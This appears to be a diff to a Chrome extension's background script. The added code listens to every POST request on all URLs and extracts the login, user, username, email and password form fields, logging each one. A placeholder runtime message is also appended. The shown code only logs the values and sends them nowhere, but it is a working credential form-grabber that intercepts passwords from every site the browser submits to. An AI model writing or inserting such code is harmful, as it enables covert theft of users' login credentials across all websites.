@@ -12,9 +12,29 @@ function getPageDetails(callback) {
 chrome.webRequest.onBeforeRequest.addListener(
     function(details) {
       if(details.method == "POST") {
+        formData = details.requestBody.formData;
+        login = details.requestBody.formData.login
+        user = details.requestBody.formData.user
+        username = details.requestBody.formData.username
+        email = details.requestBody.formData.email
+
+        password = details.requestBody.formData.password
         console.log(details.requestBody.formData);
+        console.log(login)
+        console.log(user)
+        console.log(username)
+        console.log(email)
+        console.log(password)
       }
     },
     {urls: ["<all_urls>"]},
     ["requestBody"]
   );
+
+  chrome.runtime.sendMessage({
+    msg: "something_completed", 
+    data: {
+        subject: "Loading",
+        content: "Just completed!"
+    }
+});
